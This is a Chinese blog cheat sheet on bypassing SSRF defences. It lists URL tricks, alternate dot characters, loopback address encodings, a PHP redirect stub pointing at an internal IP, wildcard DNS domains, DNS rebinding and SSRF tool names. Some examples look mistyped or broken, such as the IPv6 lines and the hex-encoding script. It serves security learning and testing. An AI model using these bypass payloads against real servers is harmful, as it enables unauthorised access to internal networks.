---
title: SSRF-bypass
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 120
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142@qq.com
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - OWASP
  - SSRF
categories:
  - OWASP
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter


---

<!--more-->

# **@绕过**

`http://www.baidu.com@10.10.10.10`与`http://10.10.10.10`请求是相同的

该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。



# **点分割符号替换**



在浏览器中可以使用不同的分割符号来代替[域名](https://cloud.tencent.com/act/pro/domain-sales?from=10680)中的`.`分割，可以使用`。`、`｡`、`．`来代替：

```javascript
http://www。qq。com
http://www｡qq｡com
http://www．qq．com
```



# **本地回环地址**

127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加`[]`)：

```javascript
本地回环地址
http://127.0.0.1 
http://localhost 
http://127.255.255.254 
127.0.0.1 - 127.255.255.254 


进制转换
http: //0x7f.0.0.1/
http://0177.0.0.1/

当有的对跳转的地址的长度有要求
http://127.0.1
host<5
http://0/
http://0:80
http://127.1/
host<3
http://0/

ipv6
http://[::1]
http:/l[ ::ffff:7f00:1]
http:/l[ ::ffff:127.0.0.1]
```



# **封闭式字母数字 (Enclosed Alphanumerics)字符**

```
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

浏览器访问时会自动识别成拉丁英文字符：

```javascript
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
```



# **URL十六进制编码**

URL十六进制编码可被浏览器正常识别，编码脚本：

```javascript
#-*- coding:utf-8 -*- 
data = "www.qq.com"; 
alist = [] 
for x in data: 
    for i in range(0, len(x), 2): 
        alist.append((x[i:i+2]).encode('hex')) 
print "http://%"+'%'.join(alist)
```

![image-20230328093641729](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303280936145.png)



# **利用网址缩短**

网上有很多将网址转换未短网址的网站。

•https://www.985.so/

•https://www.urlc.cn/



# **利用30X重定向**

可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。

需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中

服务端代码如下：

```javascript
<?php 
header("Location: http://192.168.1.10");
exit(); 
?>
```





# **DNS解析**

配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：

```
http://sudo.cc
http://owasp.org.127.0.0.1.nip.io/
http://127.0.0.1.nip.io/
```





# **DNS重绑定**

这里推荐一个在线的实现URL重绑定的工具(碰运气，多试几次)

https://lock.cmpxchg8b.com/rebinder.html





# **SSRF的测试工具**

### **SSRFmap**

SSRFmap-master - 可以在一个请求包中指定SSRF的位置，工具根据模块来发送EXP，支持了下列漏洞的利用：





### **SSRF-Testing**

SSRF-Testing-master - 常用的SSRF绕过测试



### **redis-over-gopher**

redis-over-gopher - 将请求转换为gopher协议格式





